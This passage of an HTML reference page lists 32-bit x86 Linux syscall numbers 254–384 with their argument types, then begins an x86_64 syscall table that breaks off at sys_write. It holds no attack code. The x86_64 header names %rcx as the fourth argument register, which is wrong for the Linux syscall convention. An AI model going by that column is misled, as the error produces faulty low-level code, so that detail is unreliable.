align="left">0xfd</td><td align="left">u64 cookie64</td><td align="left">char *buf</td><td align="left">size_t len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">254</td><td align="left">epoll_create</td><td align="left">0xfe</td><td align="left">int size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">255</td><td align="left">epoll_ctl</td><td align="left">0xff</td><td align="left">int epfd</td><td align="left">int op</td><td align="left">int fd</td><td align="left">struct epoll_event *event</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">256</td><td align="left">epoll_wait</td><td align="left">0x100</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">257</td><td align="left">remap_file_pages</td><td align="left">0x101</td><td align="left">unsigned long start</td><td align="left">unsigned long size</td><td align="left">unsigned long prot</td><td align="left">unsigned long pgoff</td><td align="left">unsigned long flags</td><td align="left">-</td></tr><tr><td align="left">258</td><td align="left">set_tid_address</td><td align="left">0x102</td><td align="left">int *tidptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">259</td><td align="left">timer_create</td><td align="left">0x103</td><td align="left">clockid_t which_clock</td><td align="left">struct sigevent *timer_event_spec</td><td align="left">timer_t * created_timer_id</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">260</td><td align="left">timer_settime</td><td align="left">0x104</td><td align="left">timer_t timer_id</td><td align="left">int flags</td><td align="left">const struct __kernel_itimerspec *new_setting</td><td align="left">struct itimerspec *old_setting</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">261</td><td align="left">timer_gettime</td><td align="left">0x105</td><td align="left">timer_t timer_id</td><td align="left">struct __kernel_itimerspec *setting</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">262</td><td align="left">timer_getoverrun</td><td align="left">0x106</td><td align="left">timer_t timer_id</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">263</td><td align="left">timer_delete</td><td align="left">0x107</td><td align="left">timer_t timer_id</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">264</td><td align="left">clock_settime</td><td align="left">0x108</td><td align="left">clockid_t which_clock</td><td align="left">const struct __kernel_timespec *tp</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">265</td><td align="left">clock_gettime</td><td align="left">0x109</td><td align="left">clockid_t which_clock</td><td align="left">struct __kernel_timespec *tp</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">266</td><td align="left">clock_getres</td><td align="left">0x10a</td><td align="left">clockid_t which_clock</td><td align="left">struct __kernel_timespec *tp</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">267</td><td align="left">clock_nanosleep</td><td align="left">0x10b</td><td align="left">clockid_t which_clock</td><td align="left">int flags</td><td align="left">const struct __kernel_timespec *rqtp</td><td align="left">struct __kernel_timespec *rmtp</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">268</td><td align="left">statfs64</td><td align="left">0x10c</td><td align="left">const char *path</td><td align="left">size_t sz</td><td align="left">struct statfs64 *buf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">269</td><td align="left">fstatfs64</td><td align="left">0x10d</td><td align="left">unsigned int fd</td><td align="left">size_t sz</td><td align="left">struct statfs64 *buf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">270</td><td align="left">tgkill</td><td align="left">0x10e</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">271</td><td align="left">utimes</td><td align="left">0x10f</td><td align="left">char *filename</td><td align="left">struct timeval *utimes</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">272</td><td align="left">fadvise64_64</td><td align="left">0x110</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">loff_t len</td><td align="left">int advice</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">273</td><td align="left">vserver</td><td align="left">0x111</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">274</td><td align="left">mbind</td><td align="left">0x112</td><td align="left">unsigned long start</td><td align="left">unsigned long len</td><td align="left">unsigned long mode</td><td align="left">const unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned flags</td></tr><tr><td align="left">275</td><td align="left">get_mempolicy</td><td align="left">0x113</td><td align="left">int *policy</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned long addr</td><td align="left">unsigned long flags</td><td align="left">-</td></tr><tr><td align="left">276</td><td align="left">set_mempolicy</td><td align="left">0x114</td><td align="left">int mode</td><td align="left">const unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">277</td><td align="left">mq_open</td><td align="left">0x115</td><td align="left">const char *name</td><td align="left">int oflag</td><td align="left">umode_t mode</td><td align="left">struct mq_attr *attr</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">278</td><td align="left">mq_unlink</td><td align="left">0x116</td><td align="left">const char *name</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">279</td><td align="left">mq_timedsend</td><td align="left">0x117</td><td align="left">mqd_t mqdes</td><td align="left">const char *msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int msg_prio</td><td align="left">const struct __kernel_timespec *abs_timeout</td><td align="left">-</td></tr><tr><td align="left">280</td><td align="left">mq_timedreceive</td><td align="left">0x118</td><td align="left">mqd_t mqdes</td><td align="left">char *msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int *msg_prio</td><td align="left">const struct __kernel_timespec *abs_timeout</td><td align="left">-</td></tr><tr><td align="left">281</td><td align="left">mq_notify</td><td align="left">0x119</td><td align="left">mqd_t mqdes</td><td align="left">const struct sigevent *notification</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">282</td><td align="left">mq_getsetattr</td><td align="left">0x11a</td><td align="left">mqd_t mqdes</td><td align="left">const struct mq_attr *mqstat</td><td align="left">struct mq_attr *omqstat</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">283</td><td align="left">kexec_load</td><td align="left">0x11b</td><td align="left">unsigned long entry</td><td align="left">unsigned long nr_segments</td><td align="left">struct kexec_segment *segments</td><td align="left">unsigned long flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">284</td><td align="left">waitid</td><td align="left">0x11c</td><td align="left">int which</td><td align="left">pid_t pid</td><td align="left">struct siginfo *infop</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left">-</td></tr><tr><td align="left">285</td><td align="left">not implemented</td><td align="left">0x11d</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">286</td><td align="left">add_key</td><td align="left">0x11e</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const void *_payload</td><td align="left">size_t plen</td><td align="left">key_serial_t destringid</td><td align="left">-</td></tr><tr><td align="left">287</td><td align="left">request_key</td><td align="left">0x11f</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const char *_callout_info</td><td align="left">key_serial_t destringid</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">288</td><td align="left">keyctl</td><td align="left">0x120</td><td align="left">int cmd</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left">-</td></tr><tr><td align="left">289</td><td align="left">ioprio_set</td><td align="left">0x121</td><td align="left">int which</td><td align="left">int who</td><td align="left">int ioprio</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">290</td><td align="left">ioprio_get</td><td align="left">0x122</td><td align="left">int which</td><td align="left">int who</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">291</td><td align="left">inotify_init</td><td align="left">0x123</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">292</td><td align="left">inotify_add_watch</td><td align="left">0x124</td><td align="left">int fd</td><td align="left">const char *path</td><td align="left">u32 mask</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">293</td><td align="left">inotify_rm_watch</td><td align="left">0x125</td><td align="left">int fd</td><td align="left">__s32 wd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">294</td><td align="left">migrate_pages</td><td align="left">0x126</td><td align="left">pid_t pid</td><td align="left">unsigned long maxnode</td><td align="left">const unsigned long *from</td><td align="left">const unsigned long *to</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">295</td><td align="left">openat</td><td align="left">0x127</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">296</td><td align="left">mkdirat</td><td align="left">0x128</td><td align="left">int dfd</td><td align="left">const char * pathname</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">297</td><td align="left">mknodat</td><td align="left">0x129</td><td align="left">int dfd</td><td align="left">const char * filename</td><td align="left">umode_t mode</td><td align="left">unsigned dev</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">298</td><td align="left">fchownat</td><td align="left">0x12a</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">int flag</td><td align="left">-</td></tr><tr><td align="left">299</td><td align="left">futimesat</td><td align="left">0x12b</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timeval *utimes</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">300</td><td align="left">fstatat64</td><td align="left">0x12c</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct stat64 *statbuf</td><td align="left">int flag</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">301</td><td align="left">unlinkat</td><td align="left">0x12d</td><td align="left">int dfd</td><td align="left">const char * pathname</td><td align="left">int flag</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">302</td><td align="left">renameat</td><td align="left">0x12e</td><td align="left">int olddfd</td><td align="left">const char * oldname</td><td align="left">int newdfd</td><td align="left">const char * newname</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">303</td><td align="left">linkat</td><td align="left">0x12f</td><td align="left">int olddfd</td><td align="left">const char *oldname</td><td align="left">int newdfd</td><td align="left">const char *newname</td><td align="left">int flags</td><td align="left">-</td></tr><tr><td align="left">304</td><td align="left">symlinkat</td><td align="left">0x130</td><td align="left">const char * oldname</td><td align="left">int newdfd</td><td align="left">const char * newname</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">305</td><td align="left">readlinkat</td><td align="left">0x131</td><td align="left">int dfd</td><td align="left">const char *path</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">306</td><td align="left">fchmodat</td><td align="left">0x132</td><td align="left">int dfd</td><td align="left">const char * filename</td><td align="left">umode_t mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">307</td><td align="left">faccessat</td><td align="left">0x133</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">308</td><td align="left">pselect6</td><td align="left">0x134</td><td align="left">int</td><td align="left">fd_set *</td><td align="left">fd_set *</td><td align="left">fd_set *</td><td align="left">struct timespec *</td><td align="left">void *</td></tr><tr><td align="left">309</td><td align="left">ppoll</td><td align="left">0x135</td><td align="left">struct pollfd *</td><td align="left">unsigned int</td><td align="left">struct timespec *</td><td align="left">const sigset_t *</td><td align="left">size_t</td><td align="left">-</td></tr><tr><td align="left">310</td><td align="left">unshare</td><td align="left">0x136</td><td align="left">unsigned long unshare_flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">311</td><td align="left">set_robust_list</td><td align="left">0x137</td><td align="left">struct robust_list_head *head</td><td align="left">size_t len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">312</td><td align="left">get_robust_list</td><td align="left">0x138</td><td align="left">int pid</td><td align="left">struct robust_list_head * *head_ptr</td><td align="left">size_t *len_ptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">313</td><td align="left">splice</td><td align="left">0x139</td><td align="left">int fd_in</td><td align="left">loff_t *off_in</td><td align="left">int fd_out</td><td align="left">loff_t *off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">314</td><td align="left">sync_file_range</td><td align="left">0x13a</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">loff_t nbytes</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">315</td><td align="left">tee</td><td align="left">0x13b</td><td align="left">int fdin</td><td align="left">int fdout</td><td align="left">size_t len</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">316</td><td align="left">vmsplice</td><td align="left">0x13c</td><td align="left">int fd</td><td align="left">const struct iovec *iov</td><td align="left">unsigned long nr_segs</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">317</td><td align="left">move_pages</td><td align="left">0x13d</td><td align="left">pid_t pid</td><td align="left">unsigned long nr_pages</td><td align="left">const void * *pages</td><td align="left">const int *nodes</td><td align="left">int *status</td><td align="left">int flags</td></tr><tr><td align="left">318</td><td align="left">getcpu</td><td align="left">0x13e</td><td align="left">unsigned *cpu</td><td align="left">unsigned *node</td><td align="left">struct getcpu_cache *cache</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">319</td><td align="left">epoll_pwait</td><td align="left">0x13f</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td></tr><tr><td align="left">320</td><td align="left">utimensat</td><td align="left">0x140</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timespec *utimes</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">321</td><td align="left">signalfd</td><td align="left">0x141</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">322</td><td align="left">timerfd_create</td><td align="left">0x142</td><td align="left">int clockid</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">323</td><td align="left">eventfd</td><td align="left">0x143</td><td align="left">unsigned int count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">324</td><td align="left">fallocate</td><td align="left">0x144</td><td align="left">int fd</td><td align="left">int mode</td><td align="left">loff_t offset</td><td align="left">loff_t len</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">325</td><td align="left">timerfd_settime</td><td align="left">0x145</td><td align="left">int ufd</td><td align="left">int flags</td><td align="left">const struct __kernel_itimerspec *utmr</td><td align="left">struct __kernel_itimerspec *otmr</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">326</td><td align="left">timerfd_gettime</td><td align="left">0x146</td><td align="left">int ufd</td><td align="left">struct __kernel_itimerspec *otmr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">327</td><td align="left">signalfd4</td><td align="left">0x147</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">328</td><td align="left">eventfd2</td><td align="left">0x148</td><td align="left">unsigned int count</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">329</td><td align="left">epoll_create1</td><td align="left">0x149</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">330</td><td align="left">dup3</td><td align="left">0x14a</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">331</td><td align="left">pipe2</td><td align="left">0x14b</td><td align="left">int *fildes</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">332</td><td align="left">inotify_init1</td><td align="left">0x14c</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">333</td><td align="left">preadv</td><td align="left">0x14d</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">-</td></tr><tr><td align="left">334</td><td align="left">pwritev</td><td align="left">0x14e</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">-</td></tr><tr><td align="left">335</td><td align="left">rt_tgsigqueueinfo</td><td align="left">0x14f</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">336</td><td align="left">perf_event_open</td><td align="left">0x150</td><td align="left">struct perf_event_attr *attr_uptr</td><td align="left">pid_t pid</td><td align="left">int cpu</td><td align="left">int group_fd</td><td align="left">unsigned long flags</td><td align="left">-</td></tr><tr><td align="left">337</td><td align="left">recvmmsg</td><td align="left">0x151</td><td align="left">int fd</td><td align="left">struct mmsghdr *msg</td><td align="left">unsigned int vlen</td><td align="left">unsigned flags</td><td align="left">struct timespec *timeout</td><td align="left">-</td></tr><tr><td align="left">338</td><td align="left">fanotify_init</td><td align="left">0x152</td><td align="left">unsigned int flags</td><td align="left">unsigned int event_f_flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">339</td><td align="left">fanotify_mark</td><td align="left">0x153</td><td align="left">int fanotify_fd</td><td align="left">unsigned int flags</td><td align="left">u64 mask</td><td align="left">int fd</td><td align="left">const char *pathname</td><td align="left">-</td></tr><tr><td align="left">340</td><td align="left">prlimit64</td><td align="left">0x154</td><td align="left">pid_t pid</td><td align="left">unsigned int resource</td><td align="left">const struct rlimit64 *new_rlim</td><td align="left">struct rlimit64 *old_rlim</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">341</td><td align="left">name_to_handle_at</td><td align="left">0x155</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flag</td><td align="left">-</td></tr><tr><td align="left">342</td><td align="left">open_by_handle_at</td><td align="left">0x156</td><td align="left">int mountdirfd</td><td align="left">struct file_handle *handle</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">343</td><td align="left">clock_adjtime</td><td align="left">0x157</td><td align="left">clockid_t which_clock</td><td align="left">struct timex *tx</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">344</td><td align="left">syncfs</td><td align="left">0x158</td><td align="left">int fd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">345</td><td align="left">sendmmsg</td><td align="left">0x159</td><td align="left">int fd</td><td align="left">struct mmsghdr *msg</td><td align="left">unsigned int vlen</td><td align="left">unsigned flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">346</td><td align="left">setns</td><td align="left">0x15a</td><td align="left">int fd</td><td align="left">int nstype</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">347</td><td align="left">process_vm_readv</td><td align="left">0x15b</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovec *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">348</td><td align="left">process_vm_writev</td><td align="left">0x15c</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovec *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">349</td><td align="left">kcmp</td><td align="left">0x15d</td><td align="left">pid_t pid1</td><td align="left">pid_t pid2</td><td align="left">int type</td><td align="left">unsigned long idx1</td><td align="left">unsigned long idx2</td><td align="left">-</td></tr><tr><td align="left">350</td><td align="left">finit_module</td><td align="left">0x15e</td><td align="left">int fd</td><td align="left">const char *uargs</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">351</td><td align="left">sched_setattr</td><td align="left">0x15f</td><td align="left">pid_t pid</td><td align="left">struct sched_attr *attr</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">352</td><td align="left">sched_getattr</td><td align="left">0x160</td><td align="left">pid_t pid</td><td align="left">struct sched_attr *attr</td><td align="left">unsigned int size</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">353</td><td align="left">renameat2</td><td align="left">0x161</td><td align="left">int olddfd</td><td align="left">const char *oldname</td><td align="left">int newdfd</td><td align="left">const char *newname</td><td align="left">unsigned int flags</td><td align="left">-</td></tr><tr><td align="left">354</td><td align="left">seccomp</td><td align="left">0x162</td><td align="left">unsigned int op</td><td align="left">unsigned int flags</td><td align="left">const char *uargs</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">355</td><td align="left">getrandom</td><td align="left">0x163</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">356</td><td align="left">memfd_create</td><td align="left">0x164</td><td align="left">const char *uname_ptr</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">357</td><td align="left">bpf</td><td align="left">0x165</td><td align="left">int cmd</td><td align="left">union bpf_attr *attr</td><td align="left">unsigned int size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">358</td><td align="left">execveat</td><td align="left">0x166</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">const char *const *argv</td><td align="left">const char *const *envp</td><td align="left">int flags</td><td align="left">-</td></tr><tr><td align="left">359</td><td align="left">socket</td><td align="left">0x167</td><td align="left">int</td><td align="left">int</td><td align="left">int</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">360</td><td align="left">socketpair</td><td align="left">0x168</td><td align="left">int</td><td align="left">int</td><td align="left">int</td><td align="left">int *</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">361</td><td align="left">bind</td><td align="left">0x169</td><td align="left">int</td><td align="left">struct sockaddr *</td><td align="left">int</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">362</td><td align="left">connect</td><td align="left">0x16a</td><td align="left">int</td><td align="left">struct sockaddr *</td><td align="left">int</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">363</td><td align="left">listen</td><td align="left">0x16b</td><td align="left">int</td><td align="left">int</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">364</td><td align="left">accept4</td><td align="left">0x16c</td><td align="left">int</td><td align="left">struct sockaddr *</td><td align="left">int *</td><td align="left">int</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">365</td><td align="left">getsockopt</td><td align="left">0x16d</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int *optlen</td><td align="left">-</td></tr><tr><td align="left">366</td><td align="left">setsockopt</td><td align="left">0x16e</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int optlen</td><td align="left">-</td></tr><tr><td align="left">367</td><td align="left">getsockname</td><td align="left">0x16f</td><td align="left">int</td><td align="left">struct sockaddr *</td><td align="left">int *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">368</td><td align="left">getpeername</td><td align="left">0x170</td><td align="left">int</td><td align="left">struct sockaddr *</td><td align="left">int *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">369</td><td align="left">sendto</td><td align="left">0x171</td><td align="left">int</td><td align="left">void *</td><td align="left">size_t</td><td align="left">unsigned</td><td align="left">struct sockaddr *</td><td align="left">int</td></tr><tr><td align="left">370</td><td align="left">sendmsg</td><td align="left">0x172</td><td align="left">int fd</td><td align="left">struct user_msghdr *msg</td><td align="left">unsigned flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">371</td><td align="left">recvfrom</td><td align="left">0x173</td><td align="left">int</td><td align="left">void *</td><td align="left">size_t</td><td align="left">unsigned</td><td align="left">struct sockaddr *</td><td align="left">int *</td></tr><tr><td align="left">372</td><td align="left">recvmsg</td><td align="left">0x174</td><td align="left">int fd</td><td align="left">struct user_msghdr *msg</td><td align="left">unsigned flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">373</td><td align="left">shutdown</td><td align="left">0x175</td><td align="left">int</td><td align="left">int</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">374</td><td align="left">userfaultfd</td><td align="left">0x176</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">375</td><td align="left">membarrier</td><td align="left">0x177</td><td align="left">int cmd</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">376</td><td align="left">mlock2</td><td align="left">0x178</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">377</td><td align="left">copy_file_range</td><td align="left">0x179</td><td align="left">int fd_in</td><td align="left">loff_t *off_in</td><td align="left">int fd_out</td><td align="left">loff_t *off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">378</td><td align="left">preadv2</td><td align="left">0x17a</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">rwf_t flags</td></tr><tr><td align="left">379</td><td align="left">pwritev2</td><td align="left">0x17b</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">rwf_t flags</td></tr><tr><td align="left">380</td><td align="left">pkey_mprotect</td><td align="left">0x17c</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned long prot</td><td align="left">int pkey</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">381</td><td align="left">pkey_alloc</td><td align="left">0x17d</td><td align="left">unsigned long flags</td><td align="left">unsigned long init_val</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">382</td><td align="left">pkey_free</td><td align="left">0x17e</td><td align="left">int pkey</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">383</td><td align="left">statx</td><td align="left">0x17f</td><td align="left">int dfd</td><td align="left">const char *path</td><td align="left">unsigned flags</td><td align="left">unsigned mask</td><td align="left">struct statx *buffer</td><td align="left">-</td></tr><tr><td align="left">384</td><td align="left">arch_prctl</td><td align="left">0x180</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr></tbody></table><h3 id="x86-64-Syscall-table"><a href="#x86-64-Syscall-table" class="headerlink" title="x86_64 Syscall table"></a>x86_64 Syscall table</h3><table><thead><tr><th align="left">syscall number</th><th align="left">syscall</th><th align="left">%rax</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%rcx</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">0x0</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">0x1</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td 